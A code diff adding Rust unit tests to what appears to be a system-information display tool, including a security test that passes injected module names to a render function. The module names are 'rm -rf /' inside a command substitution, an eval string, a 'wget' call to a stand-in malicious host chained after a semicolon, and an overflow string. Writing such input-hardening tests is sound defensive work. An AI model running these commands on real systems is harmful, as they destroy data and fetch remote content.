@@ -105,3 +105,41 @@ fn format_palette(config: &Config) -> String {
     }
     s
 }
+
+
+//tests
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::config::Config;
+    use crate::info::Info;
+
+    // As default or new.
+    #[test]
+    fn test_prepare_render_tree_empty() {
+        let info = Info::new();
+        let config = Config::default();
+        let modules = vec![];
+        
+        let nodes = prepare_render_tree(&info, &modules, &config);
+        assert!(nodes.is_empty());
+    }
+
+    #[test]
+    fn test_security_malicious_module_injection() {
+        let info = Info::new();
+        let config = Config::default();
+        
+        // Cybersec: test malicious module injection
+        let malicious_modules = vec![
+            ModuleConfig::Simple("$(rm -rf /)".to_string()),
+            ModuleConfig::Simple("eval('malware')".to_string()),
+            ModuleConfig::Simple("os_name; wget http://malicioso.com".to_string()),
+            ModuleConfig::Simple("A".repeat(10_000)), // Prueba contra desbordamientos
+        ];
+        
+        let nodes = prepare_render_tree(&info, &malicious_modules, &config);
+        
+        assert!(nodes.len() <= malicious_modules.len());
+    }
+}
